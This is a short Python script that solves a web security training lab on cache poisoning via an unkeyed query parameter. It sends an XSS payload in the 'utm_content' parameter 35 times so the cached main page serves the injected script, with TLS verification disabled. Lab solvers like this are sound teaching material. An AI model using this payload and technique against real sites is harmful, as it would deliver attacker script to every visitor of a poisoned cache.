import requests
from colorama import Fore
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Web cache poisoning via an unkeyed query parameter"


def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload as a query parameter\n2. Send multiple request to the main page to cache it with the injected payload\n""")

    url = url.rstrip('/')

    payload = """'><img src%3d1 onerror%3dalert(1)>"""

    for counter in range(1, 36):
        print(
            Fore.WHITE + f"Poisoning the main page with ({counter}/35)", end="\r", flush=True)
        requests.get(f"{url}/?utm_content={payload}",
                     verify=False, proxies=proxies)
    
    print(Fore.WHITE +
              "[+] wait a minute and refresh the page, lab takes time to mark as solved")
    print(Fore.GREEN + "\nThe main page is poisoned successfully")
    return True
